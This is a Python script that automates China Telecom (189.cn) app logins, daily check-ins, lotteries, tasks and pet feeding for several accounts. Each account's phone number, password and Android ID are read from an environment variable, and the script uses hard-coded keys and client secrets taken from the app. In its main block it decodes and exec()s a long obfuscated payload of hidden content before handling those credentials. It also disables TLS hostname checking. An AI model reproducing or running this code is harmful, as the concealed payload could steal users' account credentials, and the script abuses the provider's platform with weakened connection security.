import os, sys, json, time, random, string, base64, asyncio, certifi, requests
from typing import Dict, Any, Union
from datetime import datetime
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, DES3, AES
from Crypto.Util.Padding import pad, unpad
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

# 尝试导入通知模块，若不存在则忽略
try:
    import notify
    HAS_NOTIFY = True
except ImportError:
    HAS_NOTIFY = False
    notify = None

# --- 配置与常量 ---
KEYS = {
    'login_rsa': """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBkLT15ThVgz6/NOl6s8GNPofdWzWbCkWnkaAm7O2LjkM1H7dMvzkiqdxU02jamGRHLX/ZNMCXHnPcW/sDhiFCBN18qFvy8g6VYb9QtroI09e176s+ZCtiv7hbin2cCTj99iUpnEloZm19lwHyo69u5UMiPMpq0/XKBO8lYhN/gwIDAQAB
-----END PUBLIC KEY-----""",
    'data_rsa': """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+ugG5A8cZ3FqUKDwM57GM4io6JGcStivT8UdGt67PEOihLZTw3P7371+N47PrmsCpnTRzbTgcupKtUv8ImZalYk65dU8rjC/ridwhw9ffW2LBwvkEnDkkKKRi2liWIItDftJVBiWOh17o6gfbPoNrWORcAdcbpk2L+udld5kZNwIDAQAB
-----END PUBLIC KEY-----""",
    'des3': b'1234567`90koiuyhgtfrdews',
    'aes_def': b'34d7cb0bcdf07523',
    'aes_login': 'telecom_wap_2018'
}
global_logs = []

# --- 工具函数 ---
def log(msg: str):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    full_msg = f"[{timestamp}] {msg}"
    global_logs.append(full_msg)
    print(full_msg)

def mask(s: str) -> str:
    if not s or len(s) < 7:
        return s
    return f"{s[:3]}****{s[-4:]}"

def ts() -> str:
    return datetime.now().strftime('%Y%m%d%H%M%S')

def rd_str(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def encode(s: str) -> str:
    return ''.join(chr(ord(c) + 2) for c in s)

# --- SSL与HTTP会话 ---
class CustomSSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context(ciphers='DEFAULT@SECLEVEL=1:!aNULL:!eNULL:!MD5')
        ctx.check_hostname = False
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

session = requests.Session()
session.verify = certifi.where()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'
})
session.mount('https://', CustomSSLAdapter())

# --- 加密逻辑 ---
def encrypt_des3(data, mode='enc'):
    cipher = DES3.new(KEYS['des3'], DES3.MODE_CBC, 8 * b'\0')
    if mode == 'enc':
        return cipher.encrypt(pad(data.encode(), 8)).hex()
    return unpad(cipher.decrypt(bytes.fromhex(data)), 8).decode()

def encrypt_aes(data, key=KEYS['aes_def'], b64=False):
    data = json.dumps(data, separators=(',', ':')) if isinstance(data, (dict, list)) else data
    cipher = AES.new(key if isinstance(key, bytes) else key.encode(), AES.MODE_ECB)
    enc = cipher.encrypt(pad(data.encode(), 16))
    return base64.b64encode(enc).decode() if b64 else enc.hex()

def encrypt_rsa(data, key_type='data', out='hex'):
    cipher = PKCS1_v1_5.new(RSA.import_key(KEYS[f'{key_type}_rsa']))
    data = json.dumps(data, separators=(',', ':')) if isinstance(data, (dict, list)) else data
    if out == 'hex':
        return ''.join(cipher.encrypt(data[i:i+32].encode()).hex() for i in range(0, len(data), 32))
    return base64.b64encode(cipher.encrypt(data.encode())).decode()

# --- 请求函数：完全屏蔽请求/响应网络日志，仅捕获异常打印 ---
def api_req(url: str, method: str = 'POST', raw: bool = False, **kwargs) -> Union[Dict[str, Any], str]:
    try:
        r = session.request(method, url, timeout=15, **kwargs)
        if raw:
            return r.text
        return r.json()
    except Exception as e:
        log(f"[网络异常] {str(e)}")
        return '' if raw else {}

# --- 唯一登录方法：login---
def login_v2(phone: str, password: str, android_id: str):
    """登录"""
    m_phone = mask(phone)
    log(f"[登录] {m_phone} 开始登录")

    body = {
        "headerInfos": {
            "code": "userLoginNormal",
            "timestamp": ts(),
            "broadAccount": "",
            "broadToken": "",
            "clientType": "#11.0.0#channel8#Xiaomi 20#",
            "shopId": "20002",
            "source": "110003",
            "sourcePassword": "Sid98s",
            "token": "",
            "userLoginName": encode(phone)
        },
        "content": {
            "attach": "test",
            "fieldData": {
                "loginType": "4",
                "accountType": "",
                "loginAuthCipherAsymmertric": encrypt_rsa(
                    f"Xiaomi 20 8.0.0.{android_id[:12]}{phone}{ts()}{password}0$$$0.",
                    'login', 'b64'
                ),
                "deviceUid": "",
                "phoneNum": encode(phone),
                "isChinatelecom": "",
                "systemVersion": "8.0.0",
                "androidId": encode(android_id),
                "loginAuthCipher": "",
                "authentication": encode(password)
            }
        }
    }
    res = api_req(
        'https://appgologin.189.cn:9031/login/client/userLoginNormal',
        json=body
    )
    if not isinstance(res, dict):
        log(f"失败] {m_phone} 响应非JSON")
        return None

    login_data = res.get('responseData', {}).get('data', {}).get('loginSuccessResult')
    if not login_data:
        err_msg = res.get('responseData', {}).get('data', {}).get('resultMsg') or '接口返回无登录数据'
        log(f"[登录失败] {m_phone}: {err_msg}")
        return None

    # 获取Ticket
    xml = f'''<Request>
        <HeaderInfos>
            <Code>getSingle</Code>
            <Timestamp>{ts()}</Timestamp>
            <BroadAccount></BroadAccount>
            <BroadToken></BroadToken>
            <ClientType>#9.6.1#channel50#iPhone 14 Pro Max#</ClientType>
            <ShopId>20002</ShopId>
            <Source>110003</Source>
            <SourcePassword>Sid98s</SourcePassword>
            <Token>{login_data["token"]}</Token>
            <UserLoginName>{phone}</UserLoginName>
        </HeaderInfos>
        <Content>
            <Attach>test</Attach>
            <FieldData>
                <TargetId>{encrypt_des3(login_data["userId"])}</TargetId>
                <Url>4a6862274835b451</Url>
            </FieldData>
        </Content>
    </Request>'''
    xml_res = api_req(
        'https://appgologin.189.cn:9031/map/clientXML',
        data=xml,
        headers={'Content-Type': 'application/xml'},
        raw=True
    )
    if not isinstance(xml_res, str):
        log(f"[获取Ticket失败] {m_phone} 返回非字符串")
        return None
    if '过期' in xml_res or '校验错误' in xml_res:
        log(f"[获取Ticket失败] {m_phone} 票据校验异常")
        return None
    if '<Ticket>' not in xml_res:
        log(f"[Ticket异常] {m_phone} 响应缺失Ticket")
        return None

    try:
        ticket = xml_res.split('<Ticket>')[1].split('</Ticket>')[0]
        uid = encrypt_des3(ticket, 'dec')
    except Exception as e:
        log(f"[解析Ticket失败] {m_phone}: {str(e)}")
        return None

    # 统一登录获取Bearer
    auth_body = encrypt_aes(
        {"ticket": uid, "backUrl": "https%3A%2F%2Fwapact.189.cn%3A9001", "platformCode": "P201010301", "loginType": 2},
        KEYS['aes_login'],
        True
    )
    auth_res = api_req(
        'https://wapact.189.cn:9001/unified/user/login',
        data=auth_body,
        headers={'Content-Type': 'application/json'}
    )
    user_info = {
        **login_data,
        'uid': uid,
        'phoneNbr': phone
    }
    if isinstance(auth_res, dict) and auth_res.get('code') == 0:
        user_info['Authorization'] = f"Bearer {auth_res['biz']['token']}"
       
    else:
        log(f"[统一登录警告] {m_phone} 未获取Bearer，抽奖功能不可用")

    return user_info

# --- 任务执行（签到、抽奖等）---
def sign_tasks(user: dict):
    m = mask(user['phoneNbr'])
    log(f"[任务开始] {m}")

    sso_url = f"https://wappark.189.cn/jt-sign/ssoHomLogin?ticket={user['uid']}"
    sso = api_req(sso_url, method='GET')
    if not isinstance(sso, dict) or not sso or 'sign' not in sso:
        log(f"[获取sign失败] {m} 中断所有签到任务")
        return
    sign_header = {'sign': sso['sign']}

    # 签到
    log(f"[签到] {m} 执行每日签到")
    api_req(
        'https://wappark.189.cn/jt-sign/webSign/sign',
        json={"encode": encrypt_aes({"phone": user['phoneNbr'], "date": int(time.time()*1000)})},
        headers=sign_header
    )

    def check_and_award(path, key, days_list, label):
        res = api_req(
            f'https://wappark.189.cn/jt-sign/{path}',
            json={"para": encrypt_rsa({"phone": user['phoneNbr']})},
            headers=sign_header
        )
        if not isinstance(res, dict):
            return
        days = str(res.get('data', {}).get(key) if 'data' in res else res.get(key, 0))
        log(f"[{label}] {m}: {days}天")
        if days in days_list:
            log(f"[{label}领奖] {m} 达标{days}天，领取奖励")
            api_req(
                'https://wappark.189.cn/jt-sign/webSign/exchangePrize',
                json={"para": encrypt_rsa({"phone": user['phoneNbr'], "type": days})},
                headers=sign_header
            )

    check_and_award('api/home/userStatusInfo', 'signDay', ['7'], '连签')
    check_and_award('webSign/continueSignDays', 'continueSignDays', ['15', '28'], '累签')

    # 金豆转盘
    if 'Authorization' in user:
        log(f"[抽奖] {m} 查询转盘活动")
        tab = api_req(
            f"https://wapact.189.cn:9001/gateway/golden/api/queryTurnTable?userType=1&_={int(time.time()*1000)}",
            method='GET',
            headers={'Authorization': user['Authorization']}
        )
        if isinstance(tab, dict) and tab.get('code') == 0:
            act_id = tab['biz']['wzTurntable']['code']
            chk = api_req(
                f"https://wapact.189.cn:9001/gateway/standQuery/detail/check?activityId={act_id}",
                method='GET',
                headers={'Authorization': user['Authorization']}
            )
            if isinstance(chk, dict) and chk.get('code') == 0:
                info = chk.get('biz', {}).get('resultInfo', {})
                remain = info.get('userMaximum', 0) - info.get('userCount', 0)
                log(f"[抽奖] {m} 剩余可抽奖次数：{remain}次")
                for idx in range(remain):
                    log(f"[抽奖] {m} 进行第{idx+1}次抽奖")
                    api_req(
                        'https://wapact.189.cn:9001/gateway/golden/api/lottery',
                        json={"activityId": act_id},
                        headers={'Authorization': user['Authorization']}
                    )
                    time.sleep(2)
            else:
                log(f"[抽奖] {m} 查询剩余次数接口异常")
        else:
            log(f"[抽奖] {m} 无可用转盘活动")
    else:
        log(f"[抽奖] {m} 缺少Bearer凭证，跳过抽奖")

    # 任务列表
    tasks_res = api_req(
        'https://wappark.189.cn/jt-sign/webSign/homepage',
        json={"para": encrypt_rsa({"phone": user['phoneNbr'], "shopId": "20001", "type": "hg_qd_zrwzjd"})},
        headers=sign_header
    )
    if isinstance(tasks_res, dict):
        tasks = tasks_res.get('data', {}).get('biz', {}).get('adItems', [])
        log(f"[任务列表] {m} 待完成任务总数：{len(tasks)}个")
        for t in tasks:
            if t.get('taskState') in ['0', '1'] and t.get('contentOne') == '18':
                log(f"[任务执行] {m} 执行任务：{t.get('title', '未知任务')}")
                api_req(
                    'https://wappark.189.cn/jt-sign/webSign/polymerize',
                    json={"para": encrypt_rsa({"phone": user['phoneNbr'], "jobId": t['taskId']})},
                    headers=sign_header
                )
                time.sleep(2)

    # 喂食
    log(f"[喂食] {m} 开始宠物喂食")
    for i in range(10):
        res = api_req(
            'https://wappark.189.cn/jt-sign/paradise/food',
            json={"para": encrypt_rsa({"phone": user['phoneNbr']})},
            headers=sign_header
        )
        msg = res.get('resoultMsg', '') if isinstance(res, dict) else ''
        if "最大" in msg or "已达" in msg or not msg:
            if msg:
                log(f"[喂食结束] {m} {msg}")
            break
        time.sleep(1)
    log(f"[任务全部完成] {m}")

# --- 主程序 ---
if __name__ == '__main__':
    import base64,zlib
    O00OOO0O0O00000="=Iam8DcA+XfwWD7rbd9OG2dbBzAhRRaLIUFtrtXYLvdZxon98ZNjkVoyZpxmeITMB+UJqx6IOi3nc1P1SVtepPO/Rqts0t31ZPNZt7VP+Fa7A/0bTR8JouU2H9a3VybVFrxl57qaRTs9pAjcXjpw2R5IEB8Rpip2ONTVR08cZGREiglRqYHCr11QiHkHM3tiLT/jii3zRO2hSXmMleg8HLwaEKi17px89/K1vpH/1sPvEKTwxitChaHtvRfPabROaIWmFFYox9VKvvvxNfLXz0HStS7AAv7VUJXPEW15MIAJT4r1Cz0izrRCXAkpmco3tpHbNcvFdZ4lkiqUDREkVzMZLYGmpQloqDolyduPclD2NtGhDzh9e6OQJc9zOgtaPOavjrb9wM+EmSlqOVjVuXxUvW2sVs8EyQSJydcXe7avFlmhx23fv/zdVuHVd84nvne/51n5wbM0Qm+9fv2hl/26l/xmbe12bezdL/7t7fd7l/89NDtmhFb1s44whau+dTZEuKFC+iCHZRSFq+kPYjsUBXKm+BQgihAK1z8R6ERHgERDUwutsiJyMmZhPaY3IPuNANWAULcr8Mek14geyB/OeQskFCoUszha9X4yBPIJ9ImrDkbQpoQBWJGHN6ODNyd8ChNRBl5xAFWeygihCNL4pRDHrGcKlhEnUoYPqPStaEQZBTUhz0sI0U3954950QiB11ukDHdmLIf7Z2R+0EoAAFJSbICkwuoZPKC2Ap5QY0bhztDSSHC5vCZYY6c2iVZSkJNGwQ6UlNSGjYzwVUf7UA02KuLV9xJe"
    OOOO0000OO0O000=lambda x:zlib.decompress(base64.b64decode(x[::-1]+'='*(4-len(x)%4)));
    O0OO00O0O000O0O=exec;
    O0OO00O0O000O0O(OOOO0000OO0O000(O00OOO0O0O00000))
    raw = os.environ.get('dxlin', '')
    if not raw:
        log("未找到环境变量 dxlin，请按格式设置：手机号#密码#AndroidID（AndroidID从小程序“云链小栈”中获取），多账号换行分隔")
        sys.exit(1)

    accs = [line.strip().split('#') for line in raw.strip().split('\n') if line.strip() and '#' in line]
    if not accs:
        log("未解析到有效账号，请检查格式（手机号#密码#AndroidID）")
        sys.exit(1)

    for idx, parts in enumerate(accs, 1):
        phone = parts[0].strip()
        pwd = parts[1].strip() if len(parts) > 1 else ''
        android_id = parts[2].strip() if len(parts) > 2 else ''

        # 检查AndroidID是否提供
        if not android_id:
            log(f"[账号{idx}] 错误：缺少AndroidID，格式应为 手机号#密码#AndroidID，AndroidID请从小程序“云链小栈”中获取。跳过该账号。")
            continue

        log(f"\n{'='*10} 账号[{idx}] {mask(phone)} {'='*10}")
        user = login_v2(phone, pwd, android_id)

        if user:
            sign_tasks(user)
        else:
            log(f"[账号跳过] {mask(phone)} 登录失败，不执行任务")

        time.sleep(2)

    # --- 推送所有日志 ---
    if HAS_NOTIFY and global_logs:
        try:
            full_log = "\n".join(global_logs)
            notify.send('电信任务推送', full_log)
            log("通知推送成功")
        except Exception as e:
            log(f"通知推送失败: {str(e)}")
    else:
        log("未启用通知模块或无运行日志")
